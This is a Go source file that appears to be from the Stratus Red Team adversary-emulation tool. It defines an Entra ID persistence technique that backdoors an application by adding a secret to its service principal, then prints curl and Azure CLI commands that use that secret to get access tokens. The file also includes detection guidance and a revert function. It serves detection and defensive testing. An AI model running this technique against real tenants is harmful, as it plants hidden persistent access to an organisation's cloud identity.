package entra_id

import (
	"context"
	_ "embed"
	"errors"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.backdoor-application-sp",
		FriendlyName: "Backdoor Entra ID application through service principal",
		Description: `
Backdoors an existing Entra ID application by creating a new credential on the associated service principal.

Warm-up:

- Create an Entra ID application and associated service principal
- Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)

Detonation:

- Backdoor the Entra ID application by creating a new credential on the associated service principal

Notes: The warm-up mimics what happens when you create an App Registration through the Azure portal. 
When you use the Azure portal, creating an App Registration automatically creates an associated service principal. 
When using the Microsoft Graph API, the service principal needs to be created separately. 

References:

- https://www.microsoft.com/en-us/security/blog/2023/12/12/threat-actors-misuse-oauth-applications-to-automate-financially-driven-attacks/
- https://www.inversecos.com/2021/10/how-to-backdoor-azure-applications-and.html
- https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5
- https://redfoxsec.com/blog/azure-privilege-escalation-via-service-principal/
`,
		Detection: `
Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the activity type <code>Add service principal credentials</code>.
`,
		Platform:                   stratus.EntraID,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	appObjectId := params["app_object_id"]
	spAppId := params["sp_app_id"]
	spObjectId := params["sp_object_id"]

	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Backdooring Entra ID application " + appObjectId + " by creating a new credential on the associated service principal")

	credentials, err := graphClient.ServicePrincipals().ByServicePrincipalId(spObjectId).AddPassword().Post(context.Background(), nil, nil)
	if err != nil {
		return errors.New("could not create credential on associated service principal: " + err.Error())
	}

	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return errors.New("could not retrieve tenant ID: " + err.Error())
	}
	log.Println(`Done! You can now retrieve a Microsoft Graph API access token using the following command:

TENANT_ID=` + tenantId + `
curl -X POST https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token  \
   --header 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'client_id=` + spAppId + `' \
   --data-urlencode 'scope=https://graph.microsoft.com/.default' \
   --data-urlencode 'client_secret=` + *credentials.GetSecretText() + `'  \
   --data-urlencode 'grant_type=client_credentials'

Or using the Azure CLI:

az login --service-principal --allow-no-subscriptions \
	--tenant ` + tenantId + ` \
	--username ` + spAppId + ` \
	--password ` + *credentials.GetSecretText() + `
`)
	log.Println("Note that the Azure portal does not allow you to see the credentials of a service principal.")
	log.Println("Use 'az ad sp credential list --id " + spObjectId + "' to view it.")
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	spId := params["sp_object_id"]
	graphClient := providers.EntraId().GetGraphClient()

	log.Println("Listing password credentials for service principal " + spId)
	spObject := graphClient.ServicePrincipals().ByServicePrincipalId(spId)
	sp, err := spObject.Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve service principal: " + err.Error())
	}

	for _, credential := range sp.GetPasswordCredentials() {
		log.Println("Deleting service principal credential with key ID " + (*credential.GetKeyId()).String())
		req := graphmodels.NewPasswordCredential()
		req.SetKeyId(credential.GetKeyId())
		err := spObject.RemovePassword().Post(context.Background(), req, nil)
		if err != nil {
			return errors.New("could not delete service principal credentials: " + err.Error())
		}
	}
	log.Println("Successfully removed backdoor credentials on service principal " + spId)

	return nil
}
